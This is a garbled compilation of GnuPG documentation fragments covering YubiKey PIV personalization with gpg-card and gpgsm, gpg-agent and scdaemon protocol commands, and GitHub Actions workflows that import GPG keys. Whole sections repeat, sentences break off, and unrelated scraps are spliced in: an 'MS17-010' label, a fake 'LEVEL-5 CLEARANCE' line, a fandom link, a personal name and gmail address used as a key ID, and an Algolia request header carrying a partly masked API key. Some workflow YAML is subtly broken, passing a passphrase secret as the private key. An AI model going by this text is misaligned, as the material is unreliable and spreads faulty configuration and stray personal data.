jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt

MS17-010

000006

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: <6309304695z@gmail.co m> Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) ssh-add with the uppercase ‘-L $ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: keith bieszczat Email address: 6309304695z@gmail.com Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator You selected this USER-ID: "6309304695z@gmail.com"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid 6309304695z@gmail.com

run gpg in --expert mode $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save

/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
MS17-010

000006

'options file' Reads configuration from file instead of from the default per-user configuration file. The default configuration file is named scdaemon.conf and expected in the .gnupg directory

'--homedir dir' 'dir.' environment variable GNUPGHOME or (on Windows systems) by means of the Registry entry 'HKCU\Software\GNU\GnuPG:HomeDir.' --verbose gpgsm, such as ‘-vv’.

--debug flags --debug-allow-core-dump no-detach multi-server --log-file file pcsc-driver library ¶ Use library to access the smartcard reader. The current default on Unix is libpcsclite.so --reader-port number_or_string 32768 echo scd getinfo reader_list
